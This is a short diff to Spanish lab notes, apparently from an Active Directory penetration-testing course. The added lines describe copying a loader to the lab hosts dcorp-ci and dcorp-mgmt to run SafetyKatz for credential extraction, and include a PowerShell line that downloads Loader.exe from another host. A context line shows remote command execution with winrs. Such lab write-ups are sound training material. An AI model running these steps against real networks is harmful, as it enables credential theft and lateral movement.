@@ -447,4 +447,10 @@ winrs -r:dcorp-mgmt cmd /c "set computername && set username"
 ```
 
 Obteniendo respuesta lo que quiere decir que este esta abierto
-Ahora deberemos 
+Ahora deberemos de ejecutar *SafetyKatz* en *dcorp-mgmt* para extraer las credenciales. Para ello necesitaremos copiar el *Loader*. Primero en *dcorp-ci* y luego desde allí a *dcorp-mgmt*
+
+Nos lo copiamos en *dcorp-ci*
+```shell
+[dcorp-ci]
+iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe
+```
